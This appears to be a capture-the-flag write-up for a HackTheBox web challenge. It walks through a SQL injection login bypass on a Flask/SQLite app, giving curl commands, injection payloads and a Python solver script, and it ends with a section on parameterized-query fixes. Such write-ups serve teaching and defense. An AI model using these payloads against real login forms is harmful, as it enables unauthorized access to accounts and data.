## Overview

**sanitize** is an Easy HackTheBox **Web** challenge. It presents a Flask login page
that — despite its name — does no sanitization at all: the username and password are
concatenated directly into a SQLite query. The page is even kind enough to echo the
query it builds and to reflect raw database errors, so a classic
[SQL injection](https://cwe.mitre.org/data/definitions/89.html) auth bypass logs us
in as `admin` and prints the flag.

## The technique

The backend builds its authentication query by string concatenation:

```sql
select * from users where username = '<username>' AND password = '<password>';
```

User input lands inside a single-quoted SQL string literal with no escaping or
parameterization ([CWE-89](https://cwe.mitre.org/data/definitions/89.html)). A single
`'` ends that literal early, and SQLite's `--` line comment swallows everything after
it — including the `AND password = '...'` predicate. Comment out the password check and
the row for `admin` is returned with no password verification.

## Solution

First, confirm the injection. The page reflects the exact query it runs, and a lone
quote produces a SQLite parser error:

```bash
# baseline — the page echoes: select * from users where username = 'admin' AND password = 'x';
curl -s -X POST "http://<host>:<port>/" --data-urlencode "username=admin" --data-urlencode "password=x"

# single quote → reflected: <class 'sqlite3.OperationalError'> : unrecognized token
curl -s -X POST "http://<host>:<port>/" --data-urlencode "username=admin'" --data-urlencode "password=x"
```

Now comment out the password clause. Any password value works because the predicate
never runs:

```bash
curl -s -X POST "http://<host>:<port>/" --data-urlencode "username=admin'-- -" --data-urlencode "password=x"
```

The query the server executes becomes:

```sql
select * from users where username = 'admin'-- -' AND password = 'x';
```

`' OR '1'='1'-- -` is an equivalent payload. Either way we authenticate as `admin` and
the flag is rendered in the page's `slogan` span.

A small, runnable solver that re-derives the flag live:

`solve.py`:

```python
#!/usr/bin/env python3
"""HTB Web 'sanitize' — SQLite auth-bypass via comment-out injection.
Login query: select * from users where username = '<u>' AND password = '<p>';
Inject username = admin'-- -  -> comments out the AND password clause -> logs in as admin."""
import sys, re, requests
base = sys.argv[1].rstrip('/')
r = requests.post(base + '/', data={'username': "admin'-- -", 'password': 'x'}, timeout=15)
m = re.search(r'HTB\{[^}]+\}', r.text)
print(m.group(0) if m else '[!] no flag\n' + r.text[:500])
```

```bash
python3 solve.py http://<host>:<port>
# HTB{...}
```

## Why it worked

The application places untrusted input inside a SQL string literal and executes the
result, instead of using a parameterized query. A quote breaks out of the string
context and a comment discards the rest of the `WHERE` clause, so the authentication
check collapses to "select the admin row." Reflecting both the query and the raw error
back to the client also removed any need for blind techniques.

## Fix / defense

- **Use parameterized queries / prepared statements** — never concatenate input into
  SQL: `cur.execute("select * from users where username=? and password=?", (u, p))`.
- Verify passwords in application code against a stored hash rather than comparing them
  inside the SQL query.
- Never reflect the constructed query or raw database errors back to the user.
